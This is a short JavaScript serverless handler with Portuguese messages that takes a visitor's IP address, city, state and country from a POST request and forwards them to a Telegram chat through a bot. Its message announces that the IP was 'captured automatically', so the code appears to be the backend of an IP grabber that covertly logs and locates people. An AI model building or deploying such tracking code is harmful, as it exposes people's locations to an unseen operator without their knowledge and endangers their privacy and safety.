export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método não permitido' });
  }

  const { ip, cidade, estado, pais } = req.body;

  const mensagem = `📡 IP capturado automaticamente:\n\n🌐 IP: ${ip}\n🏙️ Local aproximado: ${cidade} - ${estado} - ${pais}\n🕒 Hora: ${new Date().toLocaleString("pt-BR")}`;

  const botToken = process.env.BOTTOKEN;
  const chatId = process.env.CHATID;

  try {
    const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: mensagem }),
    });

    const data = await telegramRes.json();

    if (!data.ok) {
      throw new Error(data.description);
    }

    return res.status(200).json({ ok: true });
  } catch (error) {
    return res.status(500).json({ error: 'Erro ao enviar mensagem', detalhe: error.message });
  }
}
